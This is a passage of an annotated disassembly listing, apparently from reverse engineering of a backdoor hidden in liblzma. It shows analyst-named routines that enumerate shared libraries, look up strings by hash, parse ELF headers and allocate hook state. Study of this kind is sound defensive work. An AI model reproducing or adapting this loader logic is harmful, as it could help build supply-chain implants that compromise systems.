.text.lzma_filter_flags_decoda:00000000000045CA _Llzma_filter_flags_decode_0 endp
.text.lzma_filter_flags_decoda:00000000000045CA
.text.lzma_filter_flags_decoda:00000000000045CA _text_lzma_filter_flags_decoda ends
.text.lzma_filter_flags_decoda:00000000000045CA
.text.lzma_index_buffer_encoda:00000000000045D0 ; ===========================================================================
.text.lzma_index_buffer_encoda:00000000000045D0
.text.lzma_index_buffer_encoda:00000000000045D0 ; Segment type: Pure code
.text.lzma_index_buffer_encoda:00000000000045D0 ; Segment permissions: Read/Execute
.text.lzma_index_buffer_encoda:00000000000045D0 _text_lzma_index_buffer_encoda segment para public 'CODE' use64
.text.lzma_index_buffer_encoda:00000000000045D0                 assume cs:_text_lzma_index_buffer_encoda
.text.lzma_index_buffer_encoda:00000000000045D0                 ;org 45D0h
.text.lzma_index_buffer_encoda:00000000000045D0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_buffer_encoda:00000000000045D0
.text.lzma_index_buffer_encoda:00000000000045D0 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_buffer_encoda:00000000000045D0
.text.lzma_index_buffer_encoda:00000000000045D0
.text.lzma_index_buffer_encoda:00000000000045D0 ; __int64 __fastcall Llzma_index_buffer_encode_0(Elf64_Ehdr **p_elf, struct_elf_info *a2, struct_ctx *ctx)
.text.lzma_index_buffer_encoda:00000000000045D0 _Llzma_index_buffer_encode_0 proc near  ; CODE XREF: process_shared_libraries_map+3B4↓p
.text.lzma_index_buffer_encoda:00000000000045D0                 endbr64
.text.lzma_index_buffer_encoda:00000000000045D4                 push    r14
.text.lzma_index_buffer_encoda:00000000000045D6                 mov     r14, rdi
.text.lzma_index_buffer_encoda:00000000000045D9                 mov     edi, 1          ; _QWORD
.text.lzma_index_buffer_encoda:00000000000045DE                 push    r13
.text.lzma_index_buffer_encoda:00000000000045E0                 push    r12
.text.lzma_index_buffer_encoda:00000000000045E2                 mov     r12, rsi
.text.lzma_index_buffer_encoda:00000000000045E5                 push    rbx
.text.lzma_index_buffer_encoda:00000000000045E6                 mov     rbx, rdx
.text.lzma_index_buffer_encoda:00000000000045E9                 push    rcx
.text.lzma_index_buffer_encoda:00000000000045EA                 call    get_lzma_allocator ; PIC mode
.text.lzma_index_buffer_encoda:00000000000045EF                 mov     rdi, [r14]
.text.lzma_index_buffer_encoda:00000000000045F2                 mov     rsi, r12
.text.lzma_index_buffer_encoda:00000000000045F5                 mov     r13, rax
.text.lzma_index_buffer_encoda:00000000000045F8                 call    parse_elf       ; PIC mode
.text.lzma_index_buffer_encoda:00000000000045FD                 test    eax, eax
.text.lzma_index_buffer_encoda:00000000000045FF                 jz      short loc_463D
.text.lzma_index_buffer_encoda:0000000000004601                 mov     [r13+10h], r12
.text.lzma_index_buffer_encoda:0000000000004605                 mov     rsi, r13
.text.lzma_index_buffer_encoda:0000000000004608                 mov     edi, 308h
.text.lzma_index_buffer_encoda:000000000000460D                 call    lzma_alloc      ; PIC mode
.text.lzma_index_buffer_encoda:0000000000004612                 mov     [rbx+48h], rax
.text.lzma_index_buffer_encoda:0000000000004616                 test    rax, rax
.text.lzma_index_buffer_encoda:0000000000004619                 jz      short loc_461D
.text.lzma_index_buffer_encoda:000000000000461B                 inc     dword ptr [rbx]
.text.lzma_index_buffer_encoda:000000000000461D
.text.lzma_index_buffer_encoda:000000000000461D loc_461D:                               ; CODE XREF: _Llzma_index_buffer_encode_0+49↑j
.text.lzma_index_buffer_encoda:000000000000461D                 mov     rsi, r13
.text.lzma_index_buffer_encoda:0000000000004620                 mov     edi, 878h
.text.lzma_index_buffer_encoda:0000000000004625                 call    lzma_alloc      ; PIC mode
.text.lzma_index_buffer_encoda:000000000000462A                 mov     [rbx+50h], rax
.text.lzma_index_buffer_encoda:000000000000462E                 test    rax, rax
.text.lzma_index_buffer_encoda:0000000000004631                 jz      short loc_4635
.text.lzma_index_buffer_encoda:0000000000004633                 inc     dword ptr [rbx]
.text.lzma_index_buffer_encoda:0000000000004635
.text.lzma_index_buffer_encoda:0000000000004635 loc_4635:                               ; CODE XREF: _Llzma_index_buffer_encode_0+61↑j
.text.lzma_index_buffer_encoda:0000000000004635                 xor     eax, eax
.text.lzma_index_buffer_encoda:0000000000004637                 cmp     dword ptr [rbx], 2
.text.lzma_index_buffer_encoda:000000000000463A                 setz    al
.text.lzma_index_buffer_encoda:000000000000463D
.text.lzma_index_buffer_encoda:000000000000463D loc_463D:                               ; CODE XREF: _Llzma_index_buffer_encode_0+2F↑j
.text.lzma_index_buffer_encoda:000000000000463D                 pop     rdx
.text.lzma_index_buffer_encoda:000000000000463E                 pop     rbx
.text.lzma_index_buffer_encoda:000000000000463F                 pop     r12
.text.lzma_index_buffer_encoda:0000000000004641                 pop     r13
.text.lzma_index_buffer_encoda:0000000000004643                 pop     r14
.text.lzma_index_buffer_encoda:0000000000004645                 retn
.text.lzma_index_buffer_encoda:0000000000004645 _Llzma_index_buffer_encode_0 endp
.text.lzma_index_buffer_encoda:0000000000004645
.text.lzma_index_buffer_encoda:0000000000004645 _text_lzma_index_buffer_encoda ends
.text.lzma_index_buffer_encoda:0000000000004645
.text.lzma_index_encoder_inia:0000000000004650 ; ===========================================================================
.text.lzma_index_encoder_inia:0000000000004650
.text.lzma_index_encoder_inia:0000000000004650 ; Segment type: Pure code
.text.lzma_index_encoder_inia:0000000000004650 ; Segment permissions: Read/Execute
.text.lzma_index_encoder_inia:0000000000004650 _text_lzma_index_encoder_inia segment para public 'CODE' use64
.text.lzma_index_encoder_inia:0000000000004650                 assume cs:_text_lzma_index_encoder_inia
.text.lzma_index_encoder_inia:0000000000004650                 ;org 4650h
.text.lzma_index_encoder_inia:0000000000004650                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_encoder_inia:0000000000004650
.text.lzma_index_encoder_inia:0000000000004650 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_encoder_inia:0000000000004650
.text.lzma_index_encoder_inia:0000000000004650
.text.lzma_index_encoder_inia:0000000000004650 ; _BOOL8 __fastcall process_shared_libraries_map(Elf64_Ehdr **a1, parse_lib *lib)
.text.lzma_index_encoder_inia:0000000000004650                 public process_shared_libraries_map
.text.lzma_index_encoder_inia:0000000000004650 process_shared_libraries_map proc near  ; CODE XREF: process_shared_libraries+83↓p
.text.lzma_index_encoder_inia:0000000000004650                                         ; DATA XREF: process_shared_libraries_map+145↓o
.text.lzma_index_encoder_inia:0000000000004650
.text.lzma_index_encoder_inia:0000000000004650 var_30          = qword ptr -30h
.text.lzma_index_encoder_inia:0000000000004650
.text.lzma_index_encoder_inia:0000000000004650                 endbr64
.text.lzma_index_encoder_inia:0000000000004654                 test    rdi, rdi
.text.lzma_index_encoder_inia:0000000000004657                 jz      loc_4A1F
.text.lzma_index_encoder_inia:000000000000465D                 push    r15
.text.lzma_index_encoder_inia:000000000000465F                 xor     edx, edx        ; a3
.text.lzma_index_encoder_inia:0000000000004661                 push    r14
.text.lzma_index_encoder_inia:0000000000004663                 push    r13
.text.lzma_index_encoder_inia:0000000000004665                 push    r12
.text.lzma_index_encoder_inia:0000000000004667                 mov     r12, rdi
.text.lzma_index_encoder_inia:000000000000466A                 push    rbx
.text.lzma_index_encoder_inia:000000000000466B                 mov     rbx, rsi
.text.lzma_index_encoder_inia:000000000000466E                 sub     rsp, 10h
.text.lzma_index_encoder_inia:0000000000004672                 mov     rax, [rsi+8]
.text.lzma_index_encoder_inia:0000000000004676                 mov     esi, 5B8h       ; hash
.text.lzma_index_encoder_inia:000000000000467B                 mov     rdi, [rax+8]    ; a1
.text.lzma_index_encoder_inia:000000000000467F                 call    import_lookup_get_str ; PIC mode
.text.lzma_index_encoder_inia:0000000000004684                 mov     r13, rax
.text.lzma_index_encoder_inia:0000000000004687                 test    rax, rax
.text.lzma_index_encoder_inia:000000000000468A                 jnz     short loc_46CF
.text.lzma_index_encoder_inia:000000000000468C
.text.lzma_index_encoder_inia:000000000000468C loc_468C:                               ; CODE XREF: process_shared_libraries_map+48↓j
.text.lzma_index_encoder_inia:000000000000468C                                         ; process_shared_libraries_map+52↓j ...
.text.lzma_index_encoder_inia:000000000000468C                 xor     eax, eax
.text.lzma_index_encoder_inia:000000000000468E                 jmp     loc_4A11
.text.lzma_index_encoder_inia:0000000000004693 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:0000000000004693
.text.lzma_index_encoder_inia:0000000000004693 loc_4693:                               ; CODE XREF: process_shared_libraries_map+85↓j
.text.lzma_index_encoder_inia:0000000000004693                 cmp     qword ptr [r12], 0
.text.lzma_index_encoder_inia:0000000000004698                 jz      short loc_468C
.text.lzma_index_encoder_inia:000000000000469A                 mov     rsi, [r12+8]    ; unsigned __int64
.text.lzma_index_encoder_inia:000000000000469F                 test    rsi, rsi
.text.lzma_index_encoder_inia:00000000000046A2                 jz      short loc_468C
.text.lzma_index_encoder_inia:00000000000046A4                 cmp     qword ptr [r12+10h], 0
.text.lzma_index_encoder_inia:00000000000046AA                 jz      short loc_468C
.text.lzma_index_encoder_inia:00000000000046AC                 cmp     byte ptr [rsi], 0
.text.lzma_index_encoder_inia:00000000000046AF                 jnz     short loc_46DC
.text.lzma_index_encoder_inia:00000000000046B1                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:00000000000046B4                 cmp     qword ptr [rax], 0
.text.lzma_index_encoder_inia:00000000000046B8                 jnz     short loc_468C
.text.lzma_index_encoder_inia:00000000000046BA                 mov     [rax], r12
.text.lzma_index_encoder_inia:00000000000046BD
.text.lzma_index_encoder_inia:00000000000046BD loc_46BD:                               ; CODE XREF: process_shared_libraries_map+C7↓j
.text.lzma_index_encoder_inia:00000000000046BD                                         ; process_shared_libraries_map+D5↓j ...
.text.lzma_index_encoder_inia:00000000000046BD                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:00000000000046C0                 mov     r12, [r12+18h]
.text.lzma_index_encoder_inia:00000000000046C5                 cmp     qword ptr [rax], 0
.text.lzma_index_encoder_inia:00000000000046C9                 jnz     loc_47F1
.text.lzma_index_encoder_inia:00000000000046CF
.text.lzma_index_encoder_inia:00000000000046CF loc_46CF:                               ; CODE XREF: process_shared_libraries_map+3A↑j
.text.lzma_index_encoder_inia:00000000000046CF                                         ; process_shared_libraries_map+1A6↓j ...
.text.lzma_index_encoder_inia:00000000000046CF                 cmp     qword ptr [r12+18h], 0
.text.lzma_index_encoder_inia:00000000000046D5                 jnz     short loc_4693
.text.lzma_index_encoder_inia:00000000000046D7                 jmp     loc_484B
.text.lzma_index_encoder_inia:00000000000046DC ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:00000000000046DC
.text.lzma_index_encoder_inia:00000000000046DC loc_46DC:                               ; CODE XREF: process_shared_libraries_map+5F↑j
.text.lzma_index_encoder_inia:00000000000046DC                 mov     rdi, rsi        ; _BYTE *
.text.lzma_index_encoder_inia:00000000000046DF
.text.lzma_index_encoder_inia:00000000000046DF loc_46DF:                               ; CODE XREF: process_shared_libraries_map+9E↓j
.text.lzma_index_encoder_inia:00000000000046DF                 mov     al, [rsi]
.text.lzma_index_encoder_inia:00000000000046E1                 test    al, al
.text.lzma_index_encoder_inia:00000000000046E3                 jz      short loc_46F0
.text.lzma_index_encoder_inia:00000000000046E5                 inc     rsi
.text.lzma_index_encoder_inia:00000000000046E8                 cmp     al, 2Fh ; '/'
.text.lzma_index_encoder_inia:00000000000046EA                 cmovz   rdi, rsi
.text.lzma_index_encoder_inia:00000000000046EE                 jmp     short loc_46DF
.text.lzma_index_encoder_inia:00000000000046F0 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:00000000000046F0
.text.lzma_index_encoder_inia:00000000000046F0 loc_46F0:                               ; CODE XREF: process_shared_libraries_map+93↑j
.text.lzma_index_encoder_inia:00000000000046F0                 call    table_get       ; PIC mode
.text.lzma_index_encoder_inia:00000000000046F5                 mov     rdx, [rbx]
.text.lzma_index_encoder_inia:00000000000046F8                 cmp     eax, 7D0h
.text.lzma_index_encoder_inia:00000000000046FD                 jz      loc_47DD
.text.lzma_index_encoder_inia:0000000000004703                 ja      short loc_4719
.text.lzma_index_encoder_inia:0000000000004705                 cmp     eax, 590h
.text.lzma_index_encoder_inia:000000000000470A                 jz      short loc_4786
.text.lzma_index_encoder_inia:000000000000470C                 cmp     eax, 7C0h
.text.lzma_index_encoder_inia:0000000000004711                 jz      loc_47C9
.text.lzma_index_encoder_inia:0000000000004717                 jmp     short loc_46BD
.text.lzma_index_encoder_inia:0000000000004719 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:0000000000004719
.text.lzma_index_encoder_inia:0000000000004719 loc_4719:                               ; CODE XREF: process_shared_libraries_map+B3↑j
.text.lzma_index_encoder_inia:0000000000004719                 cmp     eax, 938h
.text.lzma_index_encoder_inia:000000000000471E                 jz      short loc_4772
.text.lzma_index_encoder_inia:0000000000004720                 cmp     eax, 0A48h
.text.lzma_index_encoder_inia:0000000000004725                 jnz     short loc_46BD
.text.lzma_index_encoder_inia:0000000000004727                 cmp     qword ptr [rdx+8], 0
.text.lzma_index_encoder_inia:000000000000472C                 jnz     loc_468C
.text.lzma_index_encoder_inia:0000000000004732                 mov     rax, [rbx+8]
.text.lzma_index_encoder_inia:0000000000004736                 mov     rcx, [rax+8]
.text.lzma_index_encoder_inia:000000000000473A                 mov     rax, [r13+8]
.text.lzma_index_encoder_inia:000000000000473E                 add     rax, [rcx]
.text.lzma_index_encoder_inia:0000000000004741                 cmp     rax, r12
.text.lzma_index_encoder_inia:0000000000004744                 jnb     loc_468C
.text.lzma_index_encoder_inia:000000000000474A                 mov     rsi, r12
.text.lzma_index_encoder_inia:000000000000474D                 sub     rsi, rax
.text.lzma_index_encoder_inia:0000000000004750                 cmp     [r13+10h], rsi
.text.lzma_index_encoder_inia:0000000000004754                 jb      loc_468C
.text.lzma_index_encoder_inia:000000000000475A                 mov     rax, [rcx+20h]
.text.lzma_index_encoder_inia:000000000000475E                 cmp     [r12+10h], rax
.text.lzma_index_encoder_inia:0000000000004763                 jnz     loc_468C
.text.lzma_index_encoder_inia:0000000000004769                 mov     [rdx+8], r12
.text.lzma_index_encoder_inia:000000000000476D                 jmp     loc_46BD
.text.lzma_index_encoder_inia:0000000000004772 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:0000000000004772
.text.lzma_index_encoder_inia:0000000000004772 loc_4772:                               ; CODE XREF: process_shared_libraries_map+CE↑j
.text.lzma_index_encoder_inia:0000000000004772                 cmp     qword ptr [rdx+20h], 0
.text.lzma_index_encoder_inia:0000000000004777                 jnz     loc_468C
.text.lzma_index_encoder_inia:000000000000477D                 mov     [rdx+20h], r12
.text.lzma_index_encoder_inia:0000000000004781                 jmp     loc_46BD
.text.lzma_index_encoder_inia:0000000000004786 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:0000000000004786
.text.lzma_index_encoder_inia:0000000000004786 loc_4786:                               ; CODE XREF: process_shared_libraries_map+BA↑j
.text.lzma_index_encoder_inia:0000000000004786                 cmp     qword ptr [rdx+10h], 0
.text.lzma_index_encoder_inia:000000000000478B                 jnz     loc_468C
.text.lzma_index_encoder_inia:0000000000004791                 mov     rax, [r12]
.text.lzma_index_encoder_inia:0000000000004795                 lea     rcx, process_shared_libraries_map
.text.lzma_index_encoder_inia:000000000000479C                 cmp     rax, rcx
.text.lzma_index_encoder_inia:000000000000479F                 jnb     loc_468C
.text.lzma_index_encoder_inia:00000000000047A5                 add     rax, 400000h
.text.lzma_index_encoder_inia:00000000000047AB                 cmp     rax, rcx
.text.lzma_index_encoder_inia:00000000000047AE                 jb      loc_468C
.text.lzma_index_encoder_inia:00000000000047B4                 cmp     qword ptr [r12+18h], 0
.text.lzma_index_encoder_inia:00000000000047BA                 jz      loc_468C
.text.lzma_index_encoder_inia:00000000000047C0                 mov     [rdx+10h], r12
.text.lzma_index_encoder_inia:00000000000047C4                 jmp     loc_46BD
.text.lzma_index_encoder_inia:00000000000047C9 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:00000000000047C9
.text.lzma_index_encoder_inia:00000000000047C9 loc_47C9:                               ; CODE XREF: process_shared_libraries_map+C1↑j
.text.lzma_index_encoder_inia:00000000000047C9                 cmp     qword ptr [rdx+18h], 0
.text.lzma_index_encoder_inia:00000000000047CE                 jnz     loc_468C
.text.lzma_index_encoder_inia:00000000000047D4                 mov     [rdx+18h], r12
.text.lzma_index_encoder_inia:00000000000047D8                 jmp     loc_46BD
.text.lzma_index_encoder_inia:00000000000047DD ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:00000000000047DD
.text.lzma_index_encoder_inia:00000000000047DD loc_47DD:                               ; CODE XREF: process_shared_libraries_map+AD↑j
.text.lzma_index_encoder_inia:00000000000047DD                 cmp     qword ptr [rdx+28h], 0
.text.lzma_index_encoder_inia:00000000000047E2                 jnz     loc_468C
.text.lzma_index_encoder_inia:00000000000047E8                 mov     [rdx+28h], r12
.text.lzma_index_encoder_inia:00000000000047EC                 jmp     loc_46BD
.text.lzma_index_encoder_inia:00000000000047F1 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:00000000000047F1
.text.lzma_index_encoder_inia:00000000000047F1 loc_47F1:                               ; CODE XREF: process_shared_libraries_map+79↑j
.text.lzma_index_encoder_inia:00000000000047F1                 cmp     qword ptr [rax+18h], 0
.text.lzma_index_encoder_inia:00000000000047F6                 jz      loc_46CF
.text.lzma_index_encoder_inia:00000000000047FC                 cmp     qword ptr [rax+8], 0
.text.lzma_index_encoder_inia:0000000000004801                 jz      loc_46CF
.text.lzma_index_encoder_inia:0000000000004807                 cmp     qword ptr [rax+20h], 0
.text.lzma_index_encoder_inia:000000000000480C                 jz      loc_46CF
.text.lzma_index_encoder_inia:0000000000004812                 cmp     qword ptr [rax+10h], 0
.text.lzma_index_encoder_inia:0000000000004817                 jz      loc_46CF
.text.lzma_index_encoder_inia:000000000000481D                 cmp     qword ptr [rax+28h], 0
.text.lzma_index_encoder_inia:0000000000004822                 jz      loc_46CF
.text.lzma_index_encoder_inia:0000000000004828
.text.lzma_index_encoder_inia:0000000000004828 loc_4828:                               ; CODE XREF: process_shared_libraries_map+239↓j
.text.lzma_index_encoder_inia:0000000000004828                 mov     rax, [rbx+8]
.text.lzma_index_encoder_inia:000000000000482C                 mov     r13, [rbx+20h]
.text.lzma_index_encoder_inia:0000000000004830                 mov     r14, [rbx+18h]
.text.lzma_index_encoder_inia:0000000000004834                 mov     r15, [rbx+10h]
.text.lzma_index_encoder_inia:0000000000004838                 mov     r12, [rax]
.text.lzma_index_encoder_inia:000000000000483B                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:000000000000483E                 mov     rax, [rax]
.text.lzma_index_encoder_inia:0000000000004841                 test    rax, rax
.text.lzma_index_encoder_inia:0000000000004844                 jnz     short loc_4890
.text.lzma_index_encoder_inia:0000000000004846                 jmp     loc_468C
.text.lzma_index_encoder_inia:000000000000484B ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:000000000000484B
.text.lzma_index_encoder_inia:000000000000484B loc_484B:                               ; CODE XREF: process_shared_libraries_map+87↑j
.text.lzma_index_encoder_inia:000000000000484B                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:000000000000484E                 cmp     qword ptr [rax], 0
.text.lzma_index_encoder_inia:0000000000004852                 jz      loc_468C
.text.lzma_index_encoder_inia:0000000000004858                 cmp     qword ptr [rax+18h], 0
.text.lzma_index_encoder_inia:000000000000485D                 jz      loc_468C
.text.lzma_index_encoder_inia:0000000000004863                 cmp     qword ptr [rax+8], 0
.text.lzma_index_encoder_inia:0000000000004868                 jz      loc_468C
.text.lzma_index_encoder_inia:000000000000486E                 cmp     qword ptr [rax+20h], 0
.text.lzma_index_encoder_inia:0000000000004873                 jz      loc_468C
.text.lzma_index_encoder_inia:0000000000004879                 cmp     qword ptr [rax+10h], 0
.text.lzma_index_encoder_inia:000000000000487E                 jz      loc_468C
.text.lzma_index_encoder_inia:0000000000004884                 cmp     qword ptr [rax+28h], 0
.text.lzma_index_encoder_inia:0000000000004889                 jnz     short loc_4828
.text.lzma_index_encoder_inia:000000000000488B                 jmp     loc_468C
.text.lzma_index_encoder_inia:0000000000004890 ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:0000000000004890
.text.lzma_index_encoder_inia:0000000000004890 loc_4890:                               ; CODE XREF: process_shared_libraries_map+1F4↑j
.text.lzma_index_encoder_inia:0000000000004890                 mov     rdi, [rax]
.text.lzma_index_encoder_inia:0000000000004893                 mov     rsi, r12
.text.lzma_index_encoder_inia:0000000000004896                 call    parse_elf       ; PIC mode
.text.lzma_index_encoder_inia:000000000000489B                 test    eax, eax
.text.lzma_index_encoder_inia:000000000000489D                 jz      loc_468C
.text.lzma_index_encoder_inia:00000000000048A3                 cmp     dword ptr [r12+4Ch], 0
.text.lzma_index_encoder_inia:00000000000048A9                 jz      loc_468C
.text.lzma_index_encoder_inia:00000000000048AF                 test    byte ptr [r12+0D0h], 20h
.text.lzma_index_encoder_inia:00000000000048B8                 jz      loc_468C
.text.lzma_index_encoder_inia:00000000000048BE                 mov     esi, 1D0h
.text.lzma_index_encoder_inia:00000000000048C3                 mov     rdi, r12
.text.lzma_index_encoder_inia:00000000000048C6                 call    _Ldelta_coder_end_1 ; PIC mode
.text.lzma_index_encoder_inia:00000000000048CB                 mov     [r15], rax
.text.lzma_index_encoder_inia:00000000000048CE                 cmp     rax, 0FFFFFFh
.text.lzma_index_encoder_inia:00000000000048D4                 ja      short loc_492D
.text.lzma_index_encoder_inia:00000000000048D6                 mov     esi, 510h
.text.lzma_index_encoder_inia:00000000000048DB                 mov     rdi, r12
.text.lzma_index_encoder_inia:00000000000048DE                 call    _Ldelta_coder_end_1 ; PIC mode
.text.lzma_index_encoder_inia:00000000000048E3                 mov     [r14], rax
.text.lzma_index_encoder_inia:00000000000048E6                 cmp     rax, 0FFFFFFh
.text.lzma_index_encoder_inia:00000000000048EC                 jbe     short loc_48FB
.text.lzma_index_encoder_inia:00000000000048EE                 cmp     qword ptr [rax], 0FFFFFFh
.text.lzma_index_encoder_inia:00000000000048F5                 ja      loc_468C
.text.lzma_index_encoder_inia:00000000000048FB
.text.lzma_index_encoder_inia:00000000000048FB loc_48FB:                               ; CODE XREF: process_shared_libraries_map+29C↑j
.text.lzma_index_encoder_inia:00000000000048FB                 mov     esi, 798h
.text.lzma_index_encoder_inia:0000000000004900                 mov     rdi, r12
.text.lzma_index_encoder_inia:0000000000004903                 call    _Ldelta_coder_end_1 ; PIC mode
.text.lzma_index_encoder_inia:0000000000004908                 mov     [r13+0], rax
.text.lzma_index_encoder_inia:000000000000490C                 cmp     rax, 0FFFFFFh
.text.lzma_index_encoder_inia:0000000000004912                 ja      short loc_492D
.text.lzma_index_encoder_inia:0000000000004914
.text.lzma_index_encoder_inia:0000000000004914 loc_4914:                               ; CODE XREF: process_shared_libraries_map+2E4↓j
.text.lzma_index_encoder_inia:0000000000004914                 mov     rax, [rbx+8]
.text.lzma_index_encoder_inia:0000000000004918                 mov     rsi, [rax+20h]
.text.lzma_index_encoder_inia:000000000000491C                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:000000000000491F                 mov     rax, [rax+18h]
.text.lzma_index_encoder_inia:0000000000004923                 test    rax, rax
.text.lzma_index_encoder_inia:0000000000004926                 jnz     short loc_493B
.text.lzma_index_encoder_inia:0000000000004928                 jmp     loc_468C
.text.lzma_index_encoder_inia:000000000000492D ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:000000000000492D
.text.lzma_index_encoder_inia:000000000000492D loc_492D:                               ; CODE XREF: process_shared_libraries_map+284↑j
.text.lzma_index_encoder_inia:000000000000492D                                         ; process_shared_libraries_map+2C2↑j
.text.lzma_index_encoder_inia:000000000000492D                 cmp     qword ptr [rax], 0FFFFFFh
.text.lzma_index_encoder_inia:0000000000004934                 jbe     short loc_4914
.text.lzma_index_encoder_inia:0000000000004936                 jmp     loc_468C
.text.lzma_index_encoder_inia:000000000000493B ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:000000000000493B
.text.lzma_index_encoder_inia:000000000000493B loc_493B:                               ; CODE XREF: process_shared_libraries_map+2D6↑j
.text.lzma_index_encoder_inia:000000000000493B                 mov     rdi, [rax]
.text.lzma_index_encoder_inia:000000000000493E                 call    parse_elf       ; PIC mode
.text.lzma_index_encoder_inia:0000000000004943                 test    eax, eax
.text.lzma_index_encoder_inia:0000000000004945                 jz      loc_468C
.text.lzma_index_encoder_inia:000000000000494B                 mov     rax, [rbx+8]
.text.lzma_index_encoder_inia:000000000000494F                 xor     esi, esi
.text.lzma_index_encoder_inia:0000000000004951                 mov     r12, [rbx+28h]
.text.lzma_index_encoder_inia:0000000000004955                 mov     [rsp+38h+var_30], rsi
.text.lzma_index_encoder_inia:000000000000495A                 mov     r13, [rax+18h]
.text.lzma_index_encoder_inia:000000000000495E                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:0000000000004961                 mov     rax, [rax+10h]
.text.lzma_index_encoder_inia:0000000000004965                 test    rax, rax
.text.lzma_index_encoder_inia:0000000000004968                 jz      loc_468C
.text.lzma_index_encoder_inia:000000000000496E                 mov     rdi, [rax]
.text.lzma_index_encoder_inia:0000000000004971                 mov     rsi, r13
.text.lzma_index_encoder_inia:0000000000004974                 call    parse_elf       ; PIC mode
.text.lzma_index_encoder_inia:0000000000004979                 test    eax, eax
.text.lzma_index_encoder_inia:000000000000497B                 jz      loc_468C
.text.lzma_index_encoder_inia:0000000000004981                 test    byte ptr [r13+0D0h], 20h
.text.lzma_index_encoder_inia:0000000000004989                 jz      loc_468C
.text.lzma_index_encoder_inia:000000000000498F                 mov     edx, 1
.text.lzma_index_encoder_inia:0000000000004994                 lea     rsi, [rsp+38h+var_30]
.text.lzma_index_encoder_inia:0000000000004999                 mov     rdi, r13
.text.lzma_index_encoder_inia:000000000000499C                 call    maybe_find_freespaces ; PIC mode
.text.lzma_index_encoder_inia:00000000000049A1                 mov     rdx, [rsp+38h+var_30]
.text.lzma_index_encoder_inia:00000000000049A6                 cmp     rdx, 597h
.text.lzma_index_encoder_inia:00000000000049AD                 jbe     loc_468C
.text.lzma_index_encoder_inia:00000000000049B3                 lea     rcx, [rax+10h]
.text.lzma_index_encoder_inia:00000000000049B7                 sub     rdx, 598h
.text.lzma_index_encoder_inia:00000000000049BE                 mov     [r12], rcx
.text.lzma_index_encoder_inia:00000000000049C2                 mov     [rax+590h], rdx
.text.lzma_index_encoder_inia:00000000000049C9                 mov     rax, [rbx+8]
.text.lzma_index_encoder_inia:00000000000049CD                 mov     rsi, [rax+10h]
.text.lzma_index_encoder_inia:00000000000049D1                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:00000000000049D4                 mov     rax, [rax+28h]
.text.lzma_index_encoder_inia:00000000000049D8                 test    rax, rax
.text.lzma_index_encoder_inia:00000000000049DB                 jz      loc_468C
.text.lzma_index_encoder_inia:00000000000049E1                 mov     rdi, [rax]
.text.lzma_index_encoder_inia:00000000000049E4                 call    parse_elf       ; PIC mode
.text.lzma_index_encoder_inia:00000000000049E9                 test    eax, eax
.text.lzma_index_encoder_inia:00000000000049EB                 jz      loc_468C
.text.lzma_index_encoder_inia:00000000000049F1                 mov     rax, [rbx+8]
.text.lzma_index_encoder_inia:00000000000049F5                 mov     rdx, [rbx+30h]
.text.lzma_index_encoder_inia:00000000000049F9                 mov     rsi, [rax+10h]
.text.lzma_index_encoder_inia:00000000000049FD                 mov     rax, [rbx]
.text.lzma_index_encoder_inia:0000000000004A00                 mov     rdi, [rax+28h]
.text.lzma_index_encoder_inia:0000000000004A04                 call    _Llzma_index_buffer_encode_0 ; PIC mode
.text.lzma_index_encoder_inia:0000000000004A09                 test    eax, eax
.text.lzma_index_encoder_inia:0000000000004A0B                 setnz   al
.text.lzma_index_encoder_inia:0000000000004A0E                 movzx   eax, al
.text.lzma_index_encoder_inia:0000000000004A11
.text.lzma_index_encoder_inia:0000000000004A11 loc_4A11:                               ; CODE XREF: process_shared_libraries_map+3E↑j
.text.lzma_index_encoder_inia:0000000000004A11                 add     rsp, 10h
.text.lzma_index_encoder_inia:0000000000004A15                 pop     rbx
.text.lzma_index_encoder_inia:0000000000004A16                 pop     r12
.text.lzma_index_encoder_inia:0000000000004A18                 pop     r13
.text.lzma_index_encoder_inia:0000000000004A1A                 pop     r14
.text.lzma_index_encoder_inia:0000000000004A1C                 pop     r15
.text.lzma_index_encoder_inia:0000000000004A1E                 retn
.text.lzma_index_encoder_inia:0000000000004A1F ; ---------------------------------------------------------------------------
.text.lzma_index_encoder_inia:0000000000004A1F
.text.lzma_index_encoder_inia:0000000000004A1F loc_4A1F:                               ; CODE XREF: process_shared_libraries_map+7↑j
.text.lzma_index_encoder_inia:0000000000004A1F                 xor     eax, eax
.text.lzma_index_encoder_inia:0000000000004A21                 retn
.text.lzma_index_encoder_inia:0000000000004A21 process_shared_libraries_map endp
.text.lzma_index_encoder_inia:0000000000004A21
.text.lzma_index_encoder_inia:0000000000004A21 _text_lzma_index_encoder_inia ends
.text.lzma_index_encoder_inia:0000000000004A21
.text.lzma_index_stream_flaga:0000000000004A30 ; ===========================================================================
.text.lzma_index_stream_flaga:0000000000004A30
.text.lzma_index_stream_flaga:0000000000004A30 ; Segment type: Pure code
.text.lzma_index_stream_flaga:0000000000004A30 ; Segment permissions: Read/Execute
.text.lzma_index_stream_flaga:0000000000004A30 _text_lzma_index_stream_flaga segment para public 'CODE' use64
.text.lzma_index_stream_flaga:0000000000004A30                 assume cs:_text_lzma_index_stream_flaga
.text.lzma_index_stream_flaga:0000000000004A30                 ;org 4A30h
